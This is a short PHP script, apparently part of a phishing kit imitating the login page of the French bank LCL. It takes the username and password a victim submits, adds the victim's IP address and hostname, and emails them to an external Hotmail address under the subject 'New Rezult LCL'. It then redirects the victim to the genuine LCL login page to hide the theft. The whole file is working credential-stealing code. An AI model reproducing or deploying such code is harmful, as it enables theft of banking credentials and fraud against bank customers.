<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "https://particuliers.secure.lcl.fr/outil/UAUT/Accueil/preRoutageLogin" ;
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~ FR LCL Login ~~~~~~\n";
$message .= "User              : ".$_POST['one']."\n";
$message .= "Pass              : ".$_POST['numpad']."\n";
$message .= "~~~~~~~~~ Infos ~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= " U7l             : http://hadahowa$link\n";
$message .= "~~~~~~~ *-_ ND7-ADN _-* ~~~~~~~\n";
$send = "hamzahuygun@hotmail.com";
$subject = "New Rezult LCL | $ip ";
$headers = "From:New LCL Rezult<webmaster@localhost.com>";
mail($send,$subject,$message,$headers);
header("Location: $back");

?>